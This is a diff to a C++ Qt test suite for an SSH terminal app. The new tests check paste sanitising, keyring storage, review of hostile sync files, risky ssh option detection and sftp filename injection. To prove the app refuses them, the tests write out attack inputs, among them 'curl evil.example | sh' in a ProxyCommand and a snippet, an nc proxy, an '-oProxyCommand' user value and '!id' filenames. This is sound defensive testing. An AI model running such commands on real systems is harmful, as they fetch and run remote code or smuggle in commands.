@@ -8,10 +8,14 @@
 #include <QScopeGuard>
 #include <QProcess>
 #include <QElapsedTimer>
+#include <QClipboard>
+#include <QGuiApplication>
 #include <QInputMethodEvent>
 #include <QSignalSpy>
 #include <QTemporaryDir>
 #include <QtTest>
+
+#include <memory>
 
 #include "assistant.h"
 #include "backend.h"
@@ -171,6 +175,70 @@ private slots:
         view.sendKey("enter");
         QVERIFY(done.wait(5000));
         QVERIFY2(view.screenText(10).contains("got:yes"), qPrintable(view.screenText(10)));
+#endif
+    }
+
+    void pastedTextIsCleanedAndSeveralLinesAreAskedAbout()
+    {
+        // Escape and the other control characters never reach the program:
+        // text copied from a web page can't close the bracketed paste early
+        // (ESC [ 201 ~) or send the terminal commands. Tab and Enter stay.
+        QCOMPARE(TerminalView::cleanPaste(QString::fromUtf8("ls\x1b[201~\nrm -rf ~\r\n\tdone\x07\x7f\xc2\x9b" "31m é")),
+                 QString::fromUtf8("ls[201~\rrm -rf ~\r\tdone31m é"));
+#ifndef Q_OS_WIN
+        QClipboard *clipboard = QGuiApplication::clipboard();
+        TerminalView view;
+        view.setSize(QSizeF(800, 400));
+        QSignalSpy question(&view, &TerminalView::pasteQuestion);
+        QVERIFY(view.start("/bin/sh", {"-c", "stty -echo; while read line; do echo \"got:$line\"; done"}));
+        QTest::qWait(300);
+        // One line without Enter: typed as it is, to be looked at.
+        clipboard->setText("echo one");
+        view.pasteClipboard();
+        QCOMPARE(question.count(), 0);
+        view.sendKey("enter");
+        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:echo one"), qPrintable(view.screenText(10)), 5000);
+        // Several lines would each run as they land: asked first, nothing sent.
+        clipboard->setText("first\nsecond\x1b[201~\n");
+        view.pasteClipboard();
+        QCOMPARE(question.count(), 1);
+        QCOMPARE(question.first().at(0).toString(), QString("first\rsecond[201~\r"));
+        QCOMPARE(question.first().at(1).toInt(), 2);
+        QTest::qWait(300);
+        QVERIFY(!view.screenText(10).contains("got:first"));
+        // The answer is yes.
+        view.paste(question.first().at(0).toString());
+        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:second[201~"), qPrintable(view.screenText(10)), 5000);
+        QVERIFY(view.screenText(10).contains("got:first"));
+        // A program that asked for bracketed paste shows the lines itself.
+        view.feed("\x1b[?2004h");
+        clipboard->setText("third\nfourth");
+        view.pasteClipboard();
+        QCOMPARE(question.count(), 1);
+        view.feed("\x1b[?2004l");
+        // A touch keyboard's own clipboard pastes by committing the text
+        // whole: several lines at once are a paste too, asked about and
+        // cleaned; a word and its Enter are still just typing.
+        auto commit = [&](const QString &text) {
+            QInputMethodEvent event;
+            event.setCommitString(text);
+            QCoreApplication::sendEvent(&view, &event);
+        };
+        view.sendKey("enter"); // ends the line the last paste left open
+        commit(QString::fromUtf8("seventh\neighth\x1b[201~\n"));
+        QCOMPARE(question.count(), 2);
+        QCOMPARE(question.last().at(0).toString(), QString("seventh\reighth[201~\r"));
+        QTest::qWait(300);
+        QVERIFY(!view.screenText(10).contains("got:seventh"));
+        commit(QString::fromUtf8("typed\x1b\n"));
+        QCOMPARE(question.count(), 2);
+        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:typed"), qPrintable(view.screenText(10)), 5000);
+        // And the question can be turned off in Settings.
+        view.setConfirmPaste(false);
+        clipboard->setText("fifth\nsixth\n");
+        view.pasteClipboard();
+        QCOMPARE(question.count(), 2);
+        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:sixth"), qPrintable(view.screenText(10)), 5000);
 #endif
     }
 
@@ -402,10 +470,22 @@ private slots:
         backend.setTool("env", "/usr/bin/env");
         backend.setTool("secret-tool", fake);
         QVERIFY(!backend.saveIdentity({{"name", ""}}, {}).isEmpty());
+        // The keyring is asked in the background; identitySaved says how it went.
+        QSignalSpy saved_(&backend, &Backend::identitySaved);
         QCOMPARE(backend.saveIdentity({{"name", "Deploy"}, {"user", "deploy"}, {"identityFile", "~/.ssh/deploy"}}, "hunter2"),
                  QString());
+        QVERIFY(backend.identities().isEmpty());
+        // One at a time: a second save waits for the first.
+        QVERIFY(!backend.saveIdentity({{"name", "Other"}}, "x").isEmpty());
+        QVERIFY(saved_.wait(5000));
+        QCOMPARE(saved_.first().first().toString(), QString());
         const QVariantMap login = backend.identities().value(0).toMap();
         QVERIFY(login["hasPassword"].toBool());
+        // A login without a password is answered the same way, a moment later.
+        QCOMPARE(backend.saveIdentity({{"name", "Plain"}, {"user", "me"}}, {}), QString());
+        QVERIFY(saved_.wait(5000));
+        QCOMPARE(backend.identities().size(), 2);
+        QCOMPARE(backend.removeIdentity(backend.identities().value(1).toMap()["id"].toString()), QString());
 
         QFile calls(dir.filePath("calls"));
         QVERIFY(calls.open(QIODevice::ReadOnly));
@@ -431,6 +511,118 @@ private slots:
 
         QCOMPARE(backend.removeIdentity(login["id"].toString()), QString());
         QVERIFY(backend.identities().isEmpty());
+        // The keyring is told to drop the password, without being waited for.
+        QTRY_VERIFY_WITH_TIMEOUT(([&] {
+            QFile again(dir.filePath("calls"));
+            return again.open(QIODevice::ReadOnly)
+                && again.readAll().contains(("clear service tether identity " + login["id"].toString()).toUtf8());
+        })(), 5000);
+
+        // A keyring that fails says why, and the login isn't saved.
+        write(fake, "#!/bin/sh\necho 'keyring is locked' >&2\nexit 1\n");
+        QCOMPARE(backend.saveIdentity({{"name", "Locked"}}, "pw"), QString());
+        QVERIFY(saved_.wait(5000));
+        QVERIFY(saved_.last().first().toString().contains("keyring is locked"));
+        QVERIFY(backend.identities().isEmpty());
+    }
+
+    void slowHelpersDontBlockTheWindow()
+    {
+        // ssh's "is the connection up?" is asked without waiting for it, so a
+        // slow host can't freeze the window while startup snippets wait.
+        QTemporaryDir dir;
+        const QString slow = dir.filePath("ssh");
+        write(slow, QString("#!/bin/sh\necho \"$@\" > '%1'\nsleep 0.4\nexit 0\n").arg(dir.filePath("args")).toUtf8());
+        QFile::setPermissions(slow, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
+        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
+        backend.setTool("ssh", slow);
+        QSignalSpy checked(&backend, &Backend::connectionChecked);
+        const QVariantMap host{{"kind", "ssh"}, {"name", "Web"}, {"host", "web"}, {"user", "me"}, {"port", 2222}};
+        QElapsedTimer asking;
+        asking.start();
+        backend.checkConnection(host, "pane-1");
+        backend.checkConnection(host, "pane-1"); // still out: not asked twice
+        QVERIFY2(asking.elapsed() < 200, qPrintable(QString("asking took %1 ms").arg(asking.elapsed())));
+        QVERIFY(checked.wait(5000));
+        QCOMPARE(checked.count(), 1);
+        QCOMPARE(checked.first().at(0).toString(), QString("pane-1"));
+        QVERIFY(checked.first().at(1).toBool());
+        QFile args(dir.filePath("args"));
+        QVERIFY(args.open(QIODevice::ReadOnly));
+        const QString asked = QString::fromUtf8(args.readAll());
+        QVERIFY2(asked.startsWith("-O check -o ControlPath="), qPrintable(asked));
+        QVERIFY(asked.trimmed().endsWith("-p 2222 -l me -- web"));
+
+        // Not up, a program that hangs (cut off after a moment), and no ssh at all.
+        write(slow, "#!/bin/sh\nexit 255\n");
+        backend.checkConnection(host, "pane-2");
+        QVERIFY(checked.wait(5000));
+        QVERIFY(!checked.last().at(1).toBool());
+        write(slow, "#!/bin/sh\nexec sleep 30\n");
+        backend.checkConnection(host, "pane-3");
+        QVERIFY(checked.wait(5000));
+        QVERIFY(!checked.last().at(1).toBool());
+        backend.setTool("ssh", dir.filePath("missing"));
+        backend.checkConnection(host, "pane-4");
+        QVERIFY(checked.wait(5000));
+        QVERIFY(!checked.last().at(1).toBool());
+        // Nothing to wait for where there's no shared connection.
+        backend.checkConnection({{"kind", "serial"}, {"name", "x"}, {"device", "/dev/ttyUSB0"}}, "pane-5");
+        QVERIFY(checked.wait(1000));
+        QVERIFY(checked.last().at(1).toBool());
+    }
+
+    void askpassScriptUsesTethersOwnFolder()
+    {
+#ifndef Q_OS_WIN
+        // The helper keeps its "already offered the saved password" mark in
+        // the folder Tether made, whatever XDG_RUNTIME_DIR says or doesn't.
+        QTemporaryDir dir;
+        const QString fake = dir.filePath("secret-tool");
+        write(fake, QString("#!/bin/sh\ncase \"$1\" in lookup) echo hunter2;; store) cat > /dev/null;; esac\n").toUtf8());
+        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
+        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
+        backend.setTool("ssh", "/usr/bin/ssh");
+        backend.setTool("secret-tool", fake);
+        QSignalSpy saved_(&backend, &Backend::identitySaved);
+        QCOMPARE(backend.saveIdentity({{"name", "Deploy"}, {"user", "deploy"}}, "hunter2"), QString());
+        QVERIFY(saved_.wait(5000));
+        const QString id = backend.identities().value(0).toMap()["id"].toString();
+        const QVariantMap launch = backend.launch({{"kind", "ssh"}, {"name", "Web"}, {"host", "web"}, {"identityId", id}});
+        QString helper;
+        for (const QString &pair : launch["environment"].toStringList())
+            if (pair.startsWith("SSH_ASKPASS="))
+                helper = pair.mid(12);
+        QVERIFY(QFileInfo(helper).isExecutable());
+        QFile script(helper);
+        QVERIFY(script.open(QIODevice::ReadOnly));
+        const QString text = QString::fromUtf8(script.readAll());
+        const QString folder = QFileInfo(helper).absolutePath();
+        QVERIFY2(text.contains("dir=" + Backend::shellQuote(folder) + "\n"), qPrintable(text));
+        QVERIFY(!text.contains("XDG_RUNTIME_DIR"));
+
+        // Run as ssh would, with XDG_RUNTIME_DIR unset: the saved password
+        // is offered once, and not again to the same ssh process.
+        auto ask = [&](QString *out) {
+            QProcess p;
+            QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
+            env.remove("XDG_RUNTIME_DIR");
+            env.insert("TETHER_IDENTITY", id);
+            env.insert("TETHER_ASKPASS_NOTTY", "1");
+            env.insert("PATH", dir.path() + ":" + env.value("PATH"));
+            p.setProcessEnvironment(env);
+            p.start(helper, {"deploy@web's password: "});
+            if (!p.waitForFinished(10000))
+                return -1;
+            *out = QString::fromUtf8(p.readAllStandardOutput()).trimmed();
+            return p.exitCode();
+        };
+        QString out;
+        QCOMPARE(ask(&out), 0);
+        QCOMPARE(out, QString("hunter2"));
+        QCOMPARE(ask(&out), 1); // a wrong saved password isn't tried until the account locks
+        QVERIFY(!QDir(folder).entryList({"askpass-*"}).isEmpty());
+#endif
     }
 
     void syncFolderCarriesHostsBetweenComputers()
@@ -453,6 +645,266 @@ private slots:
         const QString id = a.profiles().value(0).toMap().value("id").toString();
         QCOMPARE(a.removeProfile(id), QString());
         QTRY_COMPARE_WITH_TIMEOUT(b.profiles().size(), 1, 5000);
+        // Host names and key paths in the shared file are nobody else's to read.
+        QCOMPARE(QFileInfo(dir.filePath("shared/tether-hosts.json")).permissions()
+                     & (QFile::ReadGroup | QFile::WriteGroup | QFile::ReadOther | QFile::WriteOther),
+                 QFile::Permissions());
+    }
+
+    // Sync tests write the shared file as another computer, or an intruder, would.
+    static QJsonObject readSync(const QString &path)
+    {
+        QFile file(path);
+        return file.open(QIODevice::ReadOnly) ? QJsonDocument::fromJson(file.readAll()).object() : QJsonObject();
+    }
+    static void writeSync(const QString &path, const QJsonObject &root)
+    {
+        write(path, QJsonDocument(root).toJson());
+    }
+    static QJsonObject syncItem(const QJsonObject &root, const QString &list, const QString &id)
+    {
+        for (const QJsonValue &value : root.value(list).toArray())
+            if (value.toObject().value("id").toString() == id)
+                return value.toObject();
+        return {};
+    }
+    static QJsonObject withSyncItem(QJsonObject root, const QString &list, const QJsonObject &item)
+    {
+        QJsonArray items;
+        for (const QJsonValue &value : root.value(list).toArray())
+            if (value.toObject().value("id") != item.value("id"))
+                items << value;
+        items << item;
+        root[list] = items;
+        return root;
+    }
+
+    void hostileSyncFileChangesNothingOnItsOwn()
+    {
+        QTemporaryDir dir;
+        QDir().mkpath(dir.filePath("shared"));
+        const QString shared = dir.filePath("shared/tether-hosts.json");
+        const QString config = dir.filePath("a.json");
+        auto backend = std::make_unique<Backend>(config, dir.filePath("ssh_config"), dir.filePath("logs"));
+        backend->setTool("ssh", "/usr/bin/ssh");
+        QCOMPARE(backend->saveSnippet({{"name", "Uptime"}, {"text", "uptime"}, {"run", true}}), QString());
+        const QString snippetId = backend->snippets().value(0).toMap()["id"].toString();
+        QCOMPARE(backend->saveProfile({{"kind", "ssh"}, {"name", "Web"}, {"host", "web.example"}, {"user", "me"}}), QString());
+        const QString id = backend->profiles().value(0).toMap()["id"].toString();
+        QCOMPARE(backend->setSetting("syncFolder", dir.filePath("shared")), QString());
+        const QJsonObject clean = readSync(shared);
+        QCOMPARE(clean["profiles"].toArray().size(), 1);
+        QSignalSpy review(backend.get(), &Backend::syncReviewChanged);
+
+        // The audit's file: the same host id, now running a program on this
+        // computer, with host checks off and a startup snippet that pipes a
+        // download into a shell.
+        QJsonObject evil = syncItem(clean, "profiles", id);
+        evil["options"] = "ProxyCommand=sh -c 'curl evil.example | sh'\nStrictHostKeyChecking no";
+        evil["host"] = "evil.example";
+        evil["startupSnippets"] = QJsonArray{"evil-snippet"};
+        evil["modified"] = double(QDateTime::currentMSecsSinceEpoch() + 1000);
+        QJsonObject snippet = syncItem(clean, "snippets", snippetId);
+        snippet["text"] = "curl evil.example | sh";
+        snippet["modified"] = evil["modified"];
+        QJsonObject file = withSyncItem(withSyncItem(clean, "profiles", evil), "snippets", snippet);
+        file = withSyncItem(file, "snippets", QJsonObject{{"id", "evil-snippet"}, {"name", "Setup"}, {"text", "curl x | sh"}, {"run", true}});
+        // A new host that runs a program, and logins no dialog would accept.
+        file = withSyncItem(file, "profiles", QJsonObject{{"id", "new-evil"}, {"kind", "ssh"}, {"name", "Backup"}, {"host", "backup.example"},
+                                                          {"options", "proxycommand   nc evil.example 22"}});
+        file = withSyncItem(file, "profiles", QJsonObject{{"id", "new-fine"}, {"kind", "ssh"}, {"name", "Docs"}, {"host", "docs.example"},
+                                                          {"options", "ServerAliveInterval=30"}});
+        file = withSyncItem(file, "identities", QJsonObject{{"id", "bad-login"}, {"name", "Root"}, {"user", "-oProxyCommand=x"}});
+        file = withSyncItem(file, "identities", QJsonObject{{"id", "odd-login"}, {"name", "Ops"}, {"user", "ops"}, {"hasPassword", true},
+                                                            {"shell", "/bin/evil"}});
+        writeSync(shared, file);
+        QTRY_VERIFY_WITH_TIMEOUT(review.count() > 0, 5000);
+
+        // The saved host is as it was, and so is the command it runs.
+        auto host = [&](const QString &which) {
+            for (const QVariant &value : backend->profiles())
+                if (value.toMap()["id"] == which)
+                    return value.toMap();
+            return QVariantMap();
+        };
+        QCOMPARE(host(id)["host"].toString(), QString("web.example"));
+        QCOMPARE(host(id)["options"].toString(), QString());
+        QVERIFY(host(id)["startupSnippets"].toList().isEmpty());
+        const QString command = backend->launch(host(id))["args"].toStringList().join(' ');
+        QVERIFY2(!command.contains("ProxyCommand") && !command.contains("evil"), qPrintable(command));
+        // The changed snippet still types what it did.
+        for (const QVariant &value : backend->snippets())
+            if (value.toMap()["id"] == snippetId)
+                QCOMPARE(value.toMap()["text"].toString(), QString("uptime"));
+        // The harmless new host came in; the one with a ProxyCommand didn't.
+        QCOMPARE(host("new-fine")["host"].toString(), QString("docs.example"));
+        QVERIFY(host("new-evil").isEmpty());
+        // Logins are checked like the vault's dialog checks them, cut down to
+        // a login's own fields, and "has a password" is this computer's to say.
+        QCOMPARE(backend->identities().size(), 1);
+        const QVariantMap login = backend->identities().value(0).toMap();
+        QCOMPARE(login["user"].toString(), QString("ops"));
+        QVERIFY(!login["hasPassword"].toBool());
+        QVERIFY(!login.contains("shell"));
+
+        // What waits says what it would change, and names the options.
+        auto waiting = [&](const QString &which) {
+            for (const QVariant &value : backend->syncReview())
+                if (value.toMap()["id"] == which)
+                    return value.toMap();
+            return QVariantMap();
+        };
+        QCOMPARE(backend->syncReview().size(), 3);
+        QVERIFY(!waiting(id)["isNew"].toBool());
+        QCOMPARE(waiting(id)["risky"].toStringList(), QStringList({"ProxyCommand", "StrictHostKeyChecking"}));
+        QStringList labels;
+        for (const QVariant &change : waiting(id)["changes"].toList())
+            labels << change.toMap()["label"].toString();
+        QVERIFY2(labels.contains("Address") && labels.contains("ssh options") && labels.contains("Startup snippets"),
+                 qPrintable(labels.join(", ")));
+        QVERIFY(waiting("new-evil")["isNew"].toBool());
+        QCOMPARE(waiting("new-evil")["risky"].toStringList(), QStringList({"proxycommand"}));
+        QCOMPARE(waiting(snippetId)["type"].toString(), QString("snippet"));
+
+        // Saving something else doesn't write this computer's older copy over
+        // the waiting one, which would undo the other computer's edit there.
+        QCOMPARE(backend->saveProfile({{"kind", "ssh"}, {"name", "Mine"}, {"host", "mine.example"}}), QString());
+        QCOMPARE(syncItem(readSync(shared), "profiles", id)["host"].toString(), QString("evil.example"));
+        QCOMPARE(syncItem(readSync(shared), "profiles", "new-evil")["name"].toString(), QString("Backup"));
+        QCOMPARE(backend->syncReview().size(), 3);
+
+        // It all survives a restart, still waiting and still not in use.
+        backend.reset();
+        backend = std::make_unique<Backend>(config, dir.filePath("ssh_config"), dir.filePath("logs"));
+        backend->setTool("ssh", "/usr/bin/ssh");
+        QCOMPARE(backend->syncReview().size(), 3);
+        QCOMPARE(host(id)["host"].toString(), QString("web.example"));
+
+        // Turned down: this computer's copy stays and is now the newer one,
+        // so it goes back to the file; the new host isn't offered again but
+        // stays in the file for the computers that want it.
+        QCOMPARE(backend->rejectSync(), QString());
+        QVERIFY(backend->syncReview().isEmpty());
+        QCOMPARE(host(id)["host"].toString(), QString("web.example"));
+        QVERIFY(host("new-evil").isEmpty());
+        QCOMPARE(syncItem(readSync(shared), "profiles", id)["host"].toString(), QString("web.example"));
+        QVERIFY(syncItem(readSync(shared), "profiles", id)["modified"].toDouble() > evil["modified"].toDouble() - 2000);
+        QCOMPARE(syncItem(readSync(shared), "profiles", "new-evil")["name"].toString(), QString("Backup"));
+        // The same file again (the intruder's copy coming back) is still older
+        // or already turned down: nothing waits.
+        writeSync(shared, withSyncItem(readSync(shared), "profiles", evil));
+        QTest::qWait(900);
+        QCOMPARE(host(id)["host"].toString(), QString("web.example"));
+        backend.reset();
+        backend = std::make_unique<Backend>(config, dir.filePath("ssh_config"), dir.filePath("logs"));
+        QVERIFY(backend->syncReview().isEmpty());
+        QVERIFY(host("new-evil").isEmpty());
+        // A different ProxyCommand for it is a new question.
+        QSignalSpy asked(backend.get(), &Backend::syncReviewChanged);
+        QJsonObject other = syncItem(readSync(shared), "profiles", "new-evil");
+        other["options"] = "ProxyCommand=nc other.example 22";
+        writeSync(shared, withSyncItem(readSync(shared), "profiles", other));
+        QTRY_COMPARE_WITH_TIMEOUT(backend->syncReview().size(), 1, 5000);
+        // Accepted, it is a host like any other.
+        QCOMPARE(backend->approveSync("new-evil"), QString());
+        QVERIFY(backend->syncReview().isEmpty());
+        QCOMPARE(host("new-evil")["options"].toString(), QString("ProxyCommand=nc other.example 22"));
+    }
+
+    void syncKeepsTheNewerEditAndAsksAboutAddresses()
+    {
+        QTemporaryDir dir;
+        QDir().mkpath(dir.filePath("shared"));
+        const QString shared = dir.filePath("shared/tether-hosts.json");
+        Backend a(dir.filePath("a.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
+        Backend b(dir.filePath("b.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
+        QCOMPARE(a.saveProfile({{"kind", "ssh"}, {"name", "Web"}, {"host", "web.example"}}), QString());
+        const QString id = a.profiles().value(0).toMap()["id"].toString();
+        QCOMPARE(a.setSetting("syncFolder", dir.filePath("shared")), QString());
+        QCOMPARE(b.setSetting("syncFolder", dir.filePath("shared")), QString());
+        QCOMPARE(b.profiles().size(), 1);
+        auto host = [&](Backend &backend) { return backend.profiles().value(0).toMap(); };
+
+        // A change that doesn't touch where the host connects just arrives.
+        QVariantMap renamed = host(a);
+        renamed["name"] = "Web server";
+        renamed["log"] = true;
+        QTest::qWait(5);
+        QCOMPARE(a.saveProfile(renamed), QString());
+        QTRY_COMPARE_WITH_TIMEOUT(host(b)["name"].toString(), QString("Web server"), 5000);
+        QVERIFY(b.syncReview().isEmpty());
+
+        // A new address from the other computer waits for a yes here, and
+        // the old one stays in use; accepted, both agree.
+        QVariantMap moved = host(a);
+        moved["host"] = "web2.example";
+        QTest::qWait(5);
+        QCOMPARE(a.saveProfile(moved), QString());
+        QTRY_COMPARE_WITH_TIMEOUT(b.syncReview().size(), 1, 5000);
+        QCOMPARE(host(b)["host"].toString(), QString("web.example"));
+        const QVariantMap change = b.syncReview().value(0).toMap()["changes"].toList().value(0).toMap();
+        QCOMPARE(change["before"].toString(), QString("web.example"));
+        QCOMPARE(change["after"].toString(), QString("web2.example"));
+        QCOMPARE(b.approveSync(id), QString());
+        QCOMPARE(host(b)["host"].toString(), QString("web2.example"));
+        QTest::qWait(900);
+        QVERIFY(a.syncReview().isEmpty());
+        QCOMPARE(host(a)["host"].toString(), QString("web2.example"));
+
+        // Two computers edit the same host; the file ends up with the older
+        // edit (a sync tool picked it). The newer one isn't lost: it stays
+        // here and goes back to the file.
+        const QJsonObject before = readSync(shared);
+        QVariantMap newer = host(a);
+        newer["name"] = "Web (newer)";
+        QTest::qWait(5);
+        QCOMPARE(a.saveProfile(newer), QString());
+        QJsonObject older = syncItem(before, "profiles", id);
+        older["name"] = "Web (older)";
+        writeSync(shared, withSyncItem(readSync(shared), "profiles", older));
+        QTRY_COMPARE_WITH_TIMEOUT(syncItem(readSync(shared), "profiles", id)["name"].toString(), QString("Web (newer)"), 5000);
+        QCOMPARE(host(a)["name"].toString(), QString("Web (newer)"));
+        QTRY_COMPARE_WITH_TIMEOUT(host(b)["name"].toString(), QString("Web (newer)"), 5000);
+
+        // An older Tether writes no times: its edits still arrive (and its
+        // address changes are still asked about).
+        QJsonObject legacy = syncItem(readSync(shared), "profiles", id);
+        legacy.remove("modified");
+        legacy["name"] = "Web (old app)";
+        writeSync(shared, withSyncItem(readSync(shared), "profiles", legacy));
+        QTRY_COMPARE_WITH_TIMEOUT(host(a)["name"].toString(), QString("Web (old app)"), 5000);
+
+        // Removed by sync and brought back under the same id with another
+        // address: that's a change to a host this computer knew, not a new
+        // host, so it waits.
+        QJsonObject gone = readSync(shared);
+        gone["profiles"] = QJsonArray();
+        gone["removed"] = QJsonArray{id};
+        writeSync(shared, gone);
+        QTRY_VERIFY_WITH_TIMEOUT(a.profiles().isEmpty(), 5000);
+        QJsonObject back = legacy;
+        back["host"] = "elsewhere.example";
+        QJsonObject returned = readSync(shared);
+        returned["removed"] = QJsonArray();
+        writeSync(shared, withSyncItem(returned, "profiles", back));
+        QTRY_COMPARE_WITH_TIMEOUT(a.syncReview().size(), 1, 5000);
+        QVERIFY(a.profiles().isEmpty());
+        QCOMPARE(a.syncReview().value(0).toMap()["changes"].toList().value(0).toMap()["before"].toString(),
+                 QString("web2.example"));
+        // Brought back as it was, it simply returns.
+        writeSync(shared, withSyncItem(returned, "profiles", legacy));
+        QTRY_COMPARE_WITH_TIMEOUT(a.profiles().size(), 1, 5000);
+        QVERIFY(a.syncReview().isEmpty());
+    }
+
+    void riskySshOptionsAreNamed()
+    {
+        QCOMPARE(Backend::riskyOptions({{"options", "ServerAliveInterval=30\nCompression yes"}}), QStringList());
+        QCOMPARE(Backend::riskyOptions({{"options", "PROXYCOMMAND = nc %h %p\nLocalCommand=x\npermitlocalcommand yes\n"
+                                                   "KnownHostsCommand /bin/x\nStrictHostKeyChecking=no\n"
+                                                   "UserKnownHostsFile /dev/null\nPKCS11Provider=/tmp/x.so"}}),
+                 QStringList({"PROXYCOMMAND", "LocalCommand", "permitlocalcommand", "KnownHostsCommand",
+                              "StrictHostKeyChecking", "UserKnownHostsFile", "PKCS11Provider"}));
     }
 
     void sftpReusesTheLogin()
@@ -497,6 +949,41 @@ private slots:
         QCOMPARE(SftpBrowser::quote("a \"b\" *.txt"), QString("\"a \\\"b\\\" \\*.txt\""));
     }
 
+    void sftpRefusesNamesWithLineBreaks()
+    {
+        // sftp reads a command per line, so the rest of such a name would be
+        // the next command, and "!…" runs a program on this computer.
+        QTemporaryDir dir;
+        const QString fake = dir.filePath("sftp");
+        write(fake, QString("#!/bin/sh\ncat >> '%1'\necho 'Remote working directory: /home/me'\n").arg(dir.filePath("batch")).toUtf8());
+        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
+        SftpBrowser browser;
+        QSignalSpy busy(&browser, &SftpBrowser::busyChanged);
+        browser.start({{"program", fake}, {"args", QStringList()}});
+        QTRY_VERIFY_WITH_TIMEOUT(!browser.busy() && browser.path() == "/home/me", 5000);
+        auto batch = [&] {
+            QFile file(dir.filePath("batch"));
+            return file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
+        };
+        const QString evil = QString("notes.txt\n!touch %1").arg(dir.filePath("ran"));
+        browser.upload({QUrl::fromLocalFile(dir.filePath(evil))});
+        QVERIFY(!browser.busy());
+        QVERIFY(!browser.error().isEmpty());
+        browser.makeFolder("a\rb");
+        browser.remove("x\n!id", false);
+        browser.rename("old", "new\n!id");
+        browser.download({"a\n!id"});
+        browser.open("sub\n!id");
+        QVERIFY(!browser.busy());
+        QVERIFY2(!batch().contains("!"), qPrintable(batch()));
+        // An ordinary name still goes through, quoted.
+        browser.makeFolder("New folder");
+        QTRY_VERIFY_WITH_TIMEOUT(batch().contains("mkdir \"New folder\""), 5000);
+        QTRY_VERIFY_WITH_TIMEOUT(!browser.busy(), 5000);
+        QCOMPARE(browser.error(), QString());
+        QVERIFY(!QFile::exists(dir.filePath("ran")));
+    }
+
     void assistantAsksForOneCommand()
     {
         const QJsonObject body = QJsonDocument::fromJson(
@@ -524,6 +1011,56 @@ private slots:
         if (qEnvironmentVariableIsEmpty("ANTHROPIC_API_KEY")) {
             QCOMPARE(assistant.keySource(), QString());
             QCOMPARE(assistant.saveKey("sk-ant-test"), QString());
+            QCOMPARE(assistant.keySource(), QString("saved"));
+            QCOMPARE(QFileInfo(dir.filePath("key")).permissions() & (QFile::ReadOther | QFile::ReadGroup), QFile::Permissions());
+        }
+    }
+
+    void apiKeyLivesInTheKeyring()
+    {
+        if (!qEnvironmentVariableIsEmpty("ANTHROPIC_API_KEY"))
+            QSKIP("ANTHROPIC_API_KEY is set here, which comes first.");
+        QTemporaryDir dir;
+        // A stand-in keyring: one entry, kept in a file.
+        const QString fake = dir.filePath("secret-tool"), ring = dir.filePath("keyring");
+        write(fake, QString("#!/bin/sh\necho \"$@\" >> '%1.calls'\ncase \"$1\" in\nstore) cat > '%1' ;;\n"
+                            "lookup) [ -f '%1' ] && cat '%1' ;;\nclear) rm -f '%1' ;;\nesac\n").arg(ring).toUtf8());
+        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
+        auto ringHolds = [&] {
+            QFile file(ring);
+            return file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
+        };
+
+        // A key an older Tether left in its file moves to the keyring, and
+        // the file goes once the keyring has it.
+        write(dir.filePath("key"), "sk-ant-from-file");
+        {
+            Assistant assistant(dir.filePath("key"), nullptr, fake);
+            QCOMPARE(assistant.keySource(), QString("saved"));
+            QTRY_COMPARE_WITH_TIMEOUT(assistant.keyStore(), QString("keyring"), 5000);
+            QTRY_VERIFY_WITH_TIMEOUT(!QFile::exists(dir.filePath("key")), 5000);
+            QCOMPARE(ringHolds(), QString("sk-ant-from-file"));
+        }
+        // Next start it comes from the keyring; a new key replaces it there.
+        {
+            Assistant assistant(dir.filePath("key"), nullptr, fake);
+            QTRY_COMPARE_WITH_TIMEOUT(assistant.keySource(), QString("saved"), 5000);
+            QCOMPARE(assistant.keyStore(), QString("keyring"));
+            QCOMPARE(assistant.saveKey("sk-ant-new"), QString());
+            QCOMPARE(assistant.keySource(), QString("saved"));
+            QTRY_COMPARE_WITH_TIMEOUT(ringHolds(), QString("sk-ant-new"), 5000);
+            QVERIFY(!QFile::exists(dir.filePath("key")));
+            // Removed: gone from the keyring too.
+            QCOMPARE(assistant.saveKey(""), QString());
+            QCOMPARE(assistant.keySource(), QString());
+            QTRY_VERIFY_WITH_TIMEOUT(!QFile::exists(ring), 5000);
+        }
+        // A keyring that won't take it: the file, readable only by the user.
+        write(fake, "#!/bin/sh\nexit 1\n");
+        {
+            Assistant assistant(dir.filePath("key"), nullptr, fake);
+            QCOMPARE(assistant.saveKey("sk-ant-fallback"), QString());
+            QTRY_COMPARE_WITH_TIMEOUT(assistant.keyStore(), QString("file"), 5000);
             QCOMPARE(assistant.keySource(), QString("saved"));
             QCOMPARE(QFileInfo(dir.filePath("key")).permissions() & (QFile::ReadOther | QFile::ReadGroup), QFile::Permissions());
         }
@@ -577,9 +1114,36 @@ private slots:
 
     void assistantCanUseClaudeCodeOnASubscription()
     {
-        const QStringList args = Assistant::claudeCodeArguments("list ports", {{"kind", "local"}});
+        // The request isn't an argument, where the process list would show
+        // it to every user of the computer; it goes in on standard input.
+        const QStringList args = Assistant::claudeCodeArguments();
         QCOMPARE(args[0], QString("-p"));
-        QVERIFY(args[1].contains("list ports"));
+        QCOMPARE(args[1], QString("--output-format"));
+        QVERIFY(!args.join(' ').contains("Session:"));
+        {
+            QTemporaryDir bin;
+            const QString fake = bin.filePath("claude");
+            write(fake, QString("#!/bin/sh\necho \"$@\" > '%1'\ncat > '%2'\n"
+                                "echo '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,"
+                                "\"structured_output\":{\"command\":\"ss -tlnp\",\"explanation\":\"Lists.\",\"risky\":false}}'\n")
+                           .arg(bin.filePath("args"), bin.filePath("stdin")).toUtf8());
